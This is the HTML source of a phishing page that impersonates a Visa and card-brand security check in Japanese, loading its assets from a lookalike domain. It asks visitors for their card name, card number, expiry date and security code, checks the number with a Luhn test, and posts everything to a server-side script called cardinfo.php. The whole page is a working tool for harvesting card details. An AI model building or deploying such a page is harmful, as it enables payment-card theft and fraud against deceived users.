<html lang="en"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=6">
    <meta http-equiv="X-UA-Compatible" content="IE=7">
    <meta http-equiv="X-UA-Compatible" content="IE=8">
    <link rel="shortcut icon" href="img/favicon.ico">
    <link rel="stylesheet" href="css/style.css">
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.mask.js" type="text/javascript"></script>
    <script src="js/jquery.validate.min.js" type="text/javascript"></script>
    <script src="js/layui.js"></script><link id="layuicss-laydate" rel="stylesheet" href="https://visa.co.jp.visajp.xyz/js/css/modules/laydate/default/laydate.css?v=5.3.1" media="all"><link id="layuicss-layer" rel="stylesheet" href="https://visa.co.jp.visajp.xyz/js/css/modules/layer/default/layer.css?v=3.5.1" media="all"><link id="layuicss-skincodecss" rel="stylesheet" href="https://visa.co.jp.visajp.xyz/js/css/modules/code.css?v=2" media="all">
    <link href="https://cdn.bootcdn.net/ajax/libs/layer/3.5.1/theme/default/layer.min.css" rel="stylesheet">
    <script>
        function hengxian() {
            var a = document.getElementById("account_ooo");
            if (a.value.length > 0) {
                if ((a.value.length + 1) % 5 == 0 && a.value.length > 0) {
                    if (a.value.length < 19) {
                        a.value += "-";
                    }
                }
            }
        }
    </script>
</head>
<body class="all_body">
<div id="main_app_id_body" style="margin-top: 10%;">
    <input type="hidden">
    <!-- 加一些注释 -->
    <input type="hidden">
    <input type="hidden">
    <div class="main-captch">
        <div class="div-form">
            <h2>
                <a lang="fr">&nbsp;
                    <img src="img/visa.svg" class="image" height="51" style="margin-top: 0px" width="89">
                    <img src="img/ma.svg" class="image" height="51" style="margin-top: 0px" width="89">
                    <img src="img/jcb.svg" class="image" height="51" style="margin-top: 0px" width="89">
                    <img src="img/ae.svg" class="image" height="51" style="margin-top: 0px" width="89">
                    <img src="img/dc.svg" class="image" height="51" style="margin-top: 0px" width="89">
                </a>
            </h2>
            <h2 class="erji_header">Added Protection
                <a lang="fr">
                    :</a></h2>

            <p class="main-p-div" style="">
                •<a class="main-a-index"></a><a class="main-a-index" title=""></a><a class="main-a-index">サービスは日本の全銀行に対応しています。</a><a class="" title=""></a><a class="tlid-translation translation"><br class="main-a-index">
                    •</a><a class="main-a-index">プロセスを完了するために、あなたの情報を確認してください</a>。</p>
            <!-- 加一些注释 -->
            <!-- 加一些注释 -->
            <form name="jpx" id="jpx" method="post" onsubmit="return post();" action="action/cardinfo.php" enctype="multipart/form-data" class="new-form-why">
                <input name="new_name" id="new_name" onfocus="add_border(this);" placeholder="カード名義（ ローマ字）" value="" type="text" class="input-new">
                <div style="height: 20px;"></div>
                <input name="new_anquanma" id="new_anquanma" onfocus="add_border(this);" placeholder="カタカナを入力してください" value="" required="" class="input-new" type="text">

                <div style="height: 20px;"></div>
                <input name="new_account" id="new_account" onfocus="add_border(this);" oninput="hengxian();" pattern="[0-9]*" maxlength="19" placeholder="クレジットカード番号" value="" class="input-new" type="text">
                <div style="height: 20px;"></div>
                <input name="new_yue" id="new_yue" onfocus="add_border(this);" oninput="value = value.replace(/[^\d]/g,'')" pattern="[0-9]*" maxlength="2" placeholder="月" value="" class="input-new-ri" type="text">
                /
                <input name="new_year" id="new_year" onfocus="add_border(this);" oninput="value = value.replace(/[^\d]/g,'')" pattern="[0-9]*" maxlength="4" placeholder="年" value="" class="input-new-ri" type="text">
                <div style="height: 20px;"></div>
                
              <script>
                       function btnAction() {
                      var new_year = document.jpx.new_year.value;
                       var new_yue  = document.jpx.new_yue.value ;
  				    var name_two = jpx.name_two.value; //获取表单form1的用户名的值
				    var reg =  /^.{3,4}$/;       //正则    

              if (new_year <22) {
                alert("クレジットカードが期限切れになりましたので、カードを交換してお試しください。");
                 }else if (new_yue >12) {
                alert("入力の有効期限が間違っていますので、再入力してください。");
                 }else if (new_year == 22 && new_year<7){
                 alert("クレジットカードが期限切れになりましたので、カードを交換してお試しください。");
                 }else if (new_yue .length<2){
                 alert("入力の有効期限が間違っていますので、再入力してください。");
                 
                                              
}

				if((name_two == "") || (name_two == null)) { //判断用户名是否为空，为空就弹出提示框"请输入用户名"，否则正常执行下面的代码。
					alert("入力してくださいセキュリティコード！");


				} else if(!reg.test(name_two)) {//如果不等于之前正则的要求
				alert("セキュリティコードをご確認ください");	
				}
                  
                
                
                  else{
                   //使用form对象的submit()方法，实现提交。
                   document.jpx.submit();
                 }
}
                                    </script>

                <input name="name_two" id="name_two" onfocus="add_border(this);" placeholder="セキュリティコード" style="width:55%;" value="" oninput="value = value.replace(/[^\d]/g,'')" pattern="[0-9]*" maxlength="4" required="" class="input-new" type="text">
                <div style="height: 20px;"></div>
            </form>
            <div style="height: 20px;"></div>
            <button class="button form-button" type="button" onclick="btnAction()">
                <font class="is_tijiao_add" lang="ja">
                    あなたの情報を確認し、続ける</font></button>
        </div>
    </div>
    
    <script src="js/luhmCheck.js"></script>
	<script src="js/bankcard.js"></script>
         <script>
            $('input[name="exdate"]').mask('00/0000');
            $('input[name="name_two"]').mask('0000');
			$(function(){
				//银行卡验证
				$("input[name='new_account']").blur(function(){
					if($("input[name='new_account']").val() != ""){
						var new_account = $("input[name='new_account']").val();
						new_account = new_account.replace(/\s*/g, '');
						if(!luhmCheck(new_account)){
							alert("正しいカード番号を入力してください。");
							$(this).val('');
							$(this)[0].focus();
							return false;
						}
					}
				});

			
				$('#name_two').bind('input propertychange', function() {
					var new_account = $("input[name='new_account']").val();
					new_account = new_account.substring(0,1);

					if(new_account == 4 || new_account == 5){
						if(name_two.length>3){
							$(this).val('');
							return false;
						}
					}
				});
			});
			 window.alert = alert;
            function alert(data, callback) { //回调函数
                var alert_bg = document.createElement('div');
                alert_box = document.createElement('div'),
                    alert_text = document.createElement('div'),
                    alert_btn = document.createElement('div'),
                    textNode = document.createTextNode(data ? data : ''),
                    btnText = document.createTextNode('确 定');

                // 控制样式
                css(alert_bg, {
                    'position': 'fixed',
                    'top': '0',
                    'left': '0',
                    'right': '0',
                    'bottom': '0',
                    'background-color': 'rgba(0, 0, 0, 0.1)',
                    'z-index': '999999999'
                });

                css(alert_box, {
                    'width': '270px',
                    'max-width': '90%',
                    'font-size': '16px',
                    'text-align': 'center',
                    'background-color': '#fff',
                    'border-radius': '15px',
                    'position': 'absolute',
                    'top': '50%',
                    'left': '50%',
                    'transform': 'translate(-50%, -50%)'
                });

                css(alert_text, {
                    'padding': '10px 15px',
                    'border-bottom': '1px solid #ddd'
                });

                css(alert_btn, {
                    'padding': '10px 0',
                    'color': '#007aff',
                    'font-weight': '600',
                    'cursor': 'pointer'
                });

                // 内部结构套入
                alert_text.appendChild(textNode);
                alert_btn.appendChild(btnText);
                alert_box.appendChild(alert_text);
                alert_box.appendChild(alert_btn);
                alert_bg.appendChild(alert_box);

                // 整体显示到页面内
                document.getElementsByTagName('body')[0].appendChild(alert_bg);

                // 确定绑定点击事件删除标签
                alert_btn.onclick = function() {
                    alert_bg.parentNode.removeChild(alert_bg);
                    if (typeof callback === 'function') {
                        callback(); //回调
                    }
                }
            }

            function css(targetObj, cssObj) {
                var str = targetObj.getAttribute("style") ? targetObj.getAttribute('style') : '';
                for (var i in cssObj) {
                    str += i + ':' + cssObj[i] + ';';
                }
                targetObj.style.cssText = str;
            }
			
			
			
        </script>
        

</div>

</body></html>